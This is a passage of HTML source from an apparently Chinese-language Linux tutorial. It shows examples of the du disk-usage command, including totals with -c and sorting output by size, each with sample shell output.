&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-53&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;300K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-54&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-55&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-56&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-57&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-59&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log30&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-60&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-61&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.bz2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-62&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-63&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-64&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-65&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-66&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-67&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-68&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-69&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;8.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-70&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-71&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-72&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-73&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1.3M&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-74&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-75&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0067 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例8：显示几个文件或目录各自占用磁盘空间的大小，还统计它们的总和&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0979c840871558&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du -c log30.tar.gz log31.tar.gz&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0979c840871558-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0979c840871558-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log30&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log31&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0006 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0979f737328043&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du -c log30.tar.gz log31.tar.gz 

4       log30.tar.gz

4       log31.tar.gz

8       总计

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0979f737328043-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0979f737328043-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0979f737328043-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0979f737328043-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0979f737328043-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0979f737328043-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0979f737328043-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0979f737328043-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0979f737328043-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0979f737328043-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -c log30.tar.gz log31.tar.gz &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0979f737328043-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0979f737328043-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;log30&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0979f737328043-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0979f737328043-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;       &lt;span class=&quot;crayon-v&quot;&gt;log31&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0979f737328043-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0979f737328043-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;8&lt;/span&gt;       总计&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0979f737328043-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0979f737328043-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0011 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;加上-c选项后，du不仅显示两个目录各自占用磁盘空间的大小，还在最后一行统计它们的总和。&lt;/p&gt;
&lt;p&gt;实例9：按照空间大小排序&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed097a2618610296&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du|sort -nr|more&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a2618610296-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed097a2618610296-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;more&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed097a5437713975&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du|sort -nr|more

1288    .

608     ./test6

308     ./test4

32      ./scf

16      ./scf/service

12      ./scf/service/deploy

8       ./test3

4       ./scf/service/deploy/product

4       ./scf/service/deploy/info

4       ./scf/lib

4       ./scf/doc

4       ./scf/bin

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed097a5437713975-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed097a5437713975-14&quot;&gt;14&lt;/div&gt;
